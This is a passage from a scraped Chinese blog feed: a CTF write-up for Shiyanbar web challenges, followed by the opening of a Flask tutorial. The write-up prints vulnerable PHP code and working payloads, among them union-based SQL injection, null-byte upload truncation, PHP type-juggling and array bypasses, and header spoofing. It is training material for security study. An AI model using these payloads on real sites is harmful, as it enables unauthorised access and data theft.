class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">........这一行是省略的代码........</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">如果登录邮箱地址不是管理员则 die()</span></span><br><span class="line"><span class="comment">数据库结构</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">-- 表的结构 `user`</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">CREATE TABLE IF NOT EXISTS `user` (</span></span><br><span class="line"><span class="comment">  `id` int(11) NOT NULL AUTO_INCREMENT,</span></span><br><span class="line"><span class="comment">  `username` varchar(255) NOT NULL,</span></span><br><span class="line"><span class="comment">  `email` varchar(255) NOT NULL,</span></span><br><span class="line"><span class="comment">  `token` int(255) NOT NULL DEFAULT '0',</span></span><br><span class="line"><span class="comment">  PRIMARY KEY (`id`)</span></span><br><span class="line"><span class="comment">) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">-- 转存表中的数据 `user`</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES</span></span><br><span class="line"><span class="comment">(1, '****不可见***', '***不可见***', 0);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">........这一行是省略的代码........</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($token)&amp;&amp;!<span class="keyword">empty</span>($emailAddress))&#123;</span><br><span class="line"><span class="keyword">if</span>(strlen($token)!=<span class="number">10</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line"><span class="keyword">if</span>($token!=<span class="string">'0'</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line">$sql = <span class="string">"SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'"</span>;</span><br><span class="line">$r = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'db error'</span>);</span><br><span class="line">$r = mysql_fetch_assoc($r);</span><br><span class="line">$r = $r[<span class="string">'num'</span>];</span><br><span class="line"><span class="keyword">if</span>($r&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"失败了呀"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>审计后的思路</p><p>1.需要GET参数token和emailAddress</p><p>2.token值长度为10且必须弱类型等于0</p><p>3.sql语句有查询结果</p><p>首先弱类型相等，且长度为10，那么token可以赋值’0000000000’</p><p>然后emailAddress猜测是在step2.php中的<a href="mailto:admin@simplexue.com" target="_blank" rel="noopener">admin@simplexue.com</a></p><p>得出payload:<a href="mailto:emailAddress=admin@simplexue.com" target="_blank" rel="noopener">emailAddress=admin@simplexue.com</a>&amp;token=0000000000</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/30.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>得到flag</p><h3 id="Once-More"><a href="#Once-More" class="headerlink" title="Once More"></a>Once More</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/more.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/more.php</a></p><p>源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strlen($_GET[<span class="string">'password'</span>]) &lt; <span class="number">8</span> &amp;&amp; $_GET[<span class="string">'password'</span>] &gt; <span class="number">9999999</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (strpos ($_GET[<span class="string">'password'</span>], <span class="string">'*-*'</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span> . $flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">'&lt;p&gt;*-* have not been found&lt;/p&gt;'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;p&gt;Invalid password&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>审计源代码，获得flag需要绕过3个检测：</p><p>1.符合ereg正则匹配，用%00绕过即可</p><p>2.password长度小于8但是值大于9999999，用科学计数法即可绕过</p><p>3.<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">最后payload:</span><br></pre></td></tr></table></figure></p><p>password=1e8%00<em>-</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### Guess Next Session</span><br><span class="line"></span><br><span class="line">网址：http://ctf5.shiyanbar.com/web/Session.php</span><br><span class="line"></span><br><span class="line">源代码：</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">&lt;?php</span><br><span class="line">session_start(); </span><br><span class="line">if (isset ($_GET[&apos;password&apos;])) &#123;</span><br><span class="line">    if ($_GET[&apos;password&apos;] == $_SESSION[&apos;password&apos;])</span><br><span class="line">        die (&apos;Flag: &apos;.$flag);</span><br><span class="line">    else</span><br><span class="line">        print &apos;&lt;p&gt;Wrong guess.&lt;/p&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>审计得flag思路：GET的参数password必须等于SESSION[‘password’]，我们知道session是存储在服务器上，但是在本地存在一个cookie字段：session_id</p><p>我们可以将cookie字段的session_id删除，然后get的参数password为空，即可让二者相等</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/31.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="FALSE"><a href="#FALSE" class="headerlink" title="FALSE"></a>FALSE</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/false.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/false.php</a></p><p>源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'name'</span>] == $_GET[<span class="string">'password'</span>])</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Your password can not be your name!&lt;/p&gt;'</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'name'</span>]) === sha1($_GET[<span class="string">'password'</span>]))</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Invalid password.&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;p&gt;Login first!&lt;/p&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到flag思路：GET的参数name和password不相等但是sha1加密后相等</p><p>查询得知sha1函数只能处理字符串类型，处理数组则返回FALSE，那么可以构造payload:</p><p>name[]=a&amp;password[]=b</p><p>a和b只要不相等就能得到flag</p><h3 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/upload/" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/upload/</a></p><p>bp截取包修改文件类型无效，修改为png文件提示必须上传php文件</p><p>尝试0x00截断</p><p>在上传路径/uploads/下添加demo.php+</p><p>并将+在十六进制中的2b替换成00</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/32.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/33.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>获取flag</p><h3 id="NSCTF-web200"><a href="#NSCTF-web200" class="headerlink" title="NSCTF web200"></a>NSCTF web200</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/web200.jpg" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/web200.jpg</a></p><p>给出加密函数，要求我们编写解密函数</p><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function decode($key)&#123;</span><br><span class="line">$_ = base64_decode(strrev(str_rot13($key)));</span><br><span class="line">$_o = &apos;&apos;;</span><br><span class="line">for($_0=0;$_0&lt;strlen($_);$_0++)&#123;</span><br><span class="line">$c = substr($_,$_0,1);</span><br><span class="line">$__ = chr(ord($c)-1);</span><br><span class="line">$_o = $_o.$__;</span><br><span class="line">&#125;</span><br><span class="line">$str = strrev($_o);</span><br><span class="line">return $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$key = &apos;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&apos;;</span><br><span class="line">echo decode($key);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>运行结果：flag:{NSCTF_b73d5adfb819c64603d7237fa0d52977}</p><h3 id="程序逻辑问题"><a href="#程序逻辑问题" class="headerlink" title="程序逻辑问题"></a>程序逻辑问题</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/5/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/5/index.php</a></p><p>源代码提示文件index.txt，访问得源代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if($_POST[&apos;user&apos;] &amp;&amp; $_POST[&apos;pass&apos;]) &#123;</span><br><span class="line">$conn = mysql_connect(&quot;********&quot;, &quot;*****&quot;, &quot;********&quot;);</span><br><span class="line">mysql_select_db(&quot;phpformysql&quot;) or die(&quot;Could not select database&quot;);</span><br><span class="line">if ($conn-&gt;connect_error)&#123;</span><br><span class="line">die(&quot;Connection failed: &quot; . mysql_error($conn));</span><br><span class="line">&#125; </span><br><span class="line">$user = $_POST[&apos;user&apos;];</span><br><span class="line">$pass = md5($_POST[&apos;pass&apos;]);</span><br><span class="line"></span><br><span class="line">$sql = &quot;select pw from php where user=&apos;$user&apos;&quot;;</span><br><span class="line">$query = mysql_query($sql);</span><br><span class="line">if (!$query) &#123;</span><br><span class="line">printf(&quot;Error: %s\n&quot;, mysql_error($conn));</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">$row = mysql_fetch_array($query, MYSQL_ASSOC);</span><br><span class="line">//echo $row[&quot;pw&quot;];</span><br><span class="line">  </span><br><span class="line">if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123;</span><br><span class="line">echo &quot;&lt;p&gt;Logged in! Key:************** &lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);</span><br><span class="line">&#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>对参数$user不存在过滤，可以进行sql注入，进而控制查询结果的pw列的数据</p><p>因为$pass是我们POST的参数pass经过md5加密后得到的值</p><p>所以构造payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=&apos; union select md5(&apos;1&apos;)#&amp;pass=1</span><br></pre></td></tr></table></figure><p>得到flag:SimCTF{youhaocongming} </p><h3 id="what-a-fuck-这是什么鬼东西"><a href="#what-a-fuck-这是什么鬼东西" class="headerlink" title="what a fuck!这是什么鬼东西?"></a>what a fuck!这是什么鬼东西?</h3><p>网址：<a href="http://ctf5.shiyanbar.com/DUTCTF/1.html" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/DUTCTF/1.html</a></p><p>页面显示一段jsfuck代码</p><p>直接放到浏览器控制台运行</p><p>弹出密码：Ihatejs</p><p>尝试即为flag</p><h3 id="PHP大法"><a href="#PHP大法" class="headerlink" title="PHP大法"></a>PHP大法</h3><p>网址：<a href="http://ctf5.shiyanbar.com/DUTCTF/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/DUTCTF/index.php</a></p><p>源代码给出提示文件index.php.txt </p><p>访问得源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,$_GET[id])) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">"hackerDJ"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;flag: *****************&#125; &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>考察url二次编码，将hackerDJ进行二次url编码后作为参数id值，浏览器首先会对id值进行一次url解码，之后绕过eregi检测后再对一次解码后的值进行二次解码，解码后得hackerDJ</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=%2568%2561%2563%256b%2565%2572%2544%254a</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/34.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="这个看起来有点简单"><a href="#这个看起来有点简单" class="headerlink" title="这个看起来有点简单!"></a>这个看起来有点简单!</h3><p>网址：<a href="http://ctf5.shiyanbar.com/8/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/8/index.php</a></p><p>输入1’,1”都报错，输入1%23返回正确信息</p><p>说明id未被引号包裹</p><p>进行sql注入：</p><p>注数据库payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%20union%20select%201,database()%23</span><br></pre></td></tr></table></figure><p>数据库名：my_db </p><p>注数据表payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%20union%20select%201,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%23</span><br></pre></td></tr></table></figure><p>数据表名：news,thiskey </p><p>注数据列payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%20union%20select%201,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27thiskey%27%23</span><br></pre></td></tr></table></figure><p>列名：k0y </p><p>注数据payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%20union%20select%201,k0y%20from%20thiskey%23</span><br></pre></td></tr></table></figure><p>flag: whatiMyD91dump </p><h3 id="貌似有点难"><a href="#貌似有点难" class="headerlink" title="貌似有点难"></a>貌似有点难</h3><p>网址：<a href="http://ctf5.shiyanbar.com/phpaudit/" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/phpaudit/</a></p><p>源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetIP</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>]))</span><br><span class="line">$cip = $_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>];</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>]))</span><br><span class="line">$cip = $_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>];</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>]))</span><br><span class="line">$cip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">$cip = <span class="string">"0.0.0.0"</span>;</span><br><span class="line"><span class="keyword">return</span> $cip;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$GetIPs = GetIP();</span><br><span class="line"><span class="keyword">if</span> ($GetIPs==<span class="string">"1.1.1.1"</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Great! Key is *********"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"错误！你的IP不在访问列表之内！"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>burp抓包添加X-Forwarded-For:1.1.1.1即可获得flag:SimCTF{daima_shengji}</p><h3 id="头有点大"><a href="#头有点大" class="headerlink" title="头有点大"></a>头有点大</h3><p>网址：<a href="http://ctf5.shiyanbar.com/sHeader/" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/sHeader/</a></p><p>页面给了提示http header</p><p>Please make sure you have installed .net framework 9.9!</p><p>Make sure you are in the region of England and browsing this site with Internet Explorer</p><p>思路就是修改http请求头部的User-Agent字段和Accept-Language字段</p><p>第一个是安装.net9.9框架  第二个是保证在英国地区 第三个是用ie浏览器 </p><p>第一个和第三个我们可以在User-Agent后加上(MSIE 9.0;.NET CLR 9.9)来实现</p><p>最后一个在英国我们把语言改成en-gb即可</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/35.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="猫抓老鼠"><a href="#猫抓老鼠" class="headerlink" title="猫抓老鼠"></a>猫抓老鼠</h3><p>网址：<a href="http://ctf5.shiyanbar.com/basic/catch/" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/basic/catch/</a></p><p>提示catch，bp抓包发现响应头部字段Content-Row: MTUzNzAzMDU2OA==</p><p>经过base64解密后1537030568</p><p>作为pass_key提交无果，直接提交pass_key=MTUzNzAzMDU2OA==得到flag</p><p>KEY: #WWWnsf0cus_NET#</p><h3 id="看起来有点难"><a href="#看起来有点难" class="headerlink" title="看起来有点难"></a>看起来有点难</h3><p>网址：<a href="http://ctf5.shiyanbar.com/basic/inject/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/basic/inject/index.php</a></p><p>注入点在admin,使用基于时间的盲注，脚本略</p>]]></content>
    
    <summary type="html">
    
      ctf
    
    </summary>
    
      <category term="ctf" scheme="https://Foxgrin.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://Foxgrin.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Python-flask</title>
    <link href="https://Foxgrin.github.io//posts/11047/"/>
    <id>https://Foxgrin.github.io//posts/11047/</id>
    <published>2018-09-08T06:06:00.000Z</published>
    <updated>2018-09-19T11:22:39.688Z</updated>
    
    <content type="html"><![CDATA[<p>Python-flask学习笔记<a id="more"></a></p><h2 id="Python虚拟环境安装"><a href="#Python虚拟环境安装" class="headerlink" title="Python虚拟环境安装"></a>Python虚拟环境安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install virtualenv</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/flask/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Python激活虚拟环境"><a href="#Python激活虚拟环境" class="headerlink" title="Python激活虚拟环境"></a>Python激活虚拟环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virtualenv [virtualenv-name]</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/flask/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">activate</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/flask/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="pip安装flask"><a href="#pip安装flask" class="headerlink" title="pip安装flask"></a>pip安装flask</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install flask</span><br></pre></td></tr></table></figure><h2 id="使用pycharm创建新项目"><a href="#使用pycharm创建新项目" class="headerlink" title="使用pycharm创建新项目"></a>使用pycharm创建新项目</h2><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/flask/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="程序基本结构"><a href="#程序基本结构" class="headerlink" title="程序基本结构"></a>程序基本结构</h2><h3 id="初始化Flask对象"><a href="#初始化Flask对象" class="headerlink" title="初始化Flask对象"></a>初始化Flask对象</h3><p>传递一个参数<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1.方便flask框架去寻找资源</span><br><span class="line"></span><br><span class="line">2.方便flask插件比如Flask-Sqlalchemy出现错误时候好去寻找问题所在</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">from flask import Flask</span><br><span class="line">app = Flask(__name__)</span><br></pre></td></tr></table></figure></p><h3 id="创建路由与视图函数"><a href="#创建路由与视图函数" class="headerlink" title="创建路由与视图函数"></a>创建路由与视图函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello World!'</span></span><br></pre></td></tr></table></figure><p>@app.route是一个装饰器，以@开头，并且在函数的上面，说明是装饰器</p><p>这个装饰器的作用，是做一个url与视图函数的映射，处理函数与url之间的映射成为路由</p><p>127.0.0.1:5000/     -&gt;     去请求hello_world这个视图函数，然后将结果返回给服务器</p><h3 id="启动服务器"><a href="#启动服务器" class="headerlink" title="启动服务器"></a>启动服务器</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure><p>app.run()作用是启动一个应用服务器，来接受用户的请求</p><h3 id="完整程序"><a href="#完整程序" class="headerlink" title="完整程序"></a>完整程序</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello World!'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><h2 id="设置debug模式"><a href="#设置debug模式" class="headerlink" title="设置debug模式"></a>设置debug模式</h2><p>1.在app.run()中传入一个关键字参数debug,app.run(debug=True)，就设置当前项目为debug模式</p><p>2.debug模式的两大功能：</p><p>(1)当程序出现问题的时候，可以在页面中看到错误信息和出错的位置。</p><p>(2)只要修改了项目中的python文件，程序会自动加载，不需要手动重新启动服务器</p><h2 id="url传参数"><a href="#url传参数" class="headerlink" 